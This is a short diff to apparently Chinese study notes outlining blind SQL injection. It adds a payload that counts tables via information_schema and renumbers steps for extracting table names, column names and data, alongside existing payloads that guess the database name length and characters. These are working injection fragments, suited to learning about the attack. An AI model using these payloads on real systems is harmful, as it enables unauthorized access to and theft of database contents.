@@ -65,12 +65,19 @@ user()查看当前用户
 ```
 and (select length (database())) = '8'
 ```
+
+
 3. 获取数据库名称
 and (select ord(substring(database(),1,1))) = 97
-4. 获取表长度
-5. 获取表名称
-6. 获取列长度
-7. 获取列名称
+
+4.获取表总数
+```
+and (select count(table_name) from information_schema.tables where table_schema = database()) = 5
+```
+5. 获取表名长度
+6. 获取表名
+7. 获取字段长度
+7. 获取字段名称
 8. 获取数据
 
 
